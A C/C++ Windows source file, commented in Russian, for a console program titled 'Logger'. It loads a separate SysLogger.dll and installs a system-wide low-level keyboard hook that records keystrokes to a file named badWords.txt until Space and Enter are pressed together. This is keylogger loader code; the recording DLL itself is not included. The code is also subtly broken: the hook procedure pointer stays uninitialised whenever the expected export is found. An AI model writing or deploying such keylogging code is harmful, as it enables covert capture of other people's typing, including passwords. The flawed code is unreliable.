// Клавиша "End" - Bb|XOД
//
// [+]Опции проекта[+] Настроить:
// [Configuration] General [Character set] "Multi-Byte Character Set"

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Модуль загружаемой библиотеки.
HINSTANCE g_hLib;

// Функции библиотеки.
BOOL (__stdcall* pKBDStart)(LPCTSTR Filename);
void (__stdcall* pKBDStop)();
HRESULT (FAR STDAPICALLTYPE* pKBDProc)(int,WPARAM,LPARAM);

HHOOK g_hkKey;
char g_szDllFilename[] = "C:\\projects\\SysLogger\\bin\\SysLog\\SysLogger.dll";
char g_szLogFilename[] = "C:\\projects\\SysLogger\\bin\\SysLog\\badWords.txt";

void
Cleanup() {
    if( g_hkKey != NULL ) { UnhookWindowsHookEx(g_hkKey); g_hkKey = NULL; }
    if( g_hLib ) { FreeLibrary(g_hLib); g_hLib = NULL; }
}

//
// Entry Point.
//
int main(int argc, char** argv) {
    SetConsoleTitle("Logger"); system("mode 50, 25");

    g_hLib = LoadLibrary(g_szDllFilename);
    if( g_hLib < (HINSTANCE)HINSTANCE_ERROR ) {
        g_hLib = NULL;
        return EXIT_FAILURE;
    }
    HOOKPROC startAddr = (HOOKPROC)GetProcAddress(g_hLib, "KBDStart");
    if(startAddr == NULL) {
        printf("no start"); return EXIT_FAILURE;
    }
    HOOKPROC procAddr;
    (FARPROC&)pKBDStart = GetProcAddress(g_hLib, "KBDStart");
    if( pKBDStart == NULL ) {FreeLibrary(g_hLib); printf("no start"); return EXIT_FAILURE; }
    (FARPROC&)pKBDStop = GetProcAddress(g_hLib, "KBDStop");
    if( pKBDStop == NULL ) {FreeLibrary(g_hLib); printf("no Stop"); return EXIT_FAILURE; }
    (FARPROC&)pKBDProc = GetProcAddress(g_hLib, "KBDProc");
    if( pKBDProc == NULL ) {
               procAddr = (HOOKPROC)GetProcAddress(g_hLib, "KBDProc@12");
                if(procAddr == NULL) {
                        FreeLibrary(g_hLib); printf("no Proc\n"); return EXIT_FAILURE;
                }
             }

    //|/|/|/|/|/|/|/|
    // ... Run ...
    //\/|/\/\/\/\/\/|
    if( -1 == pKBDStart(g_szLogFilename) ) {FreeLibrary(g_hLib); printf("no start KeyBoard");  return EXIT_FAILURE;}
    g_hkKey = SetWindowsHookEx(WH_KEYBOARD_LL, procAddr, g_hLib, 0);
    if( !g_hkKey ) {FreeLibrary(g_hLib); printf("no key"); return EXIT_FAILURE;}

    MSG msg;
    memset(&msg, 0, sizeof(MSG));
    while( ! (GetAsyncKeyState(VK_SPACE) && GetAsyncKeyState(VK_RETURN))) {
        //printf("wait");
        Sleep(10);
        if( PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) ) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    Cleanup(); return EXIT_SUCCESS;
}
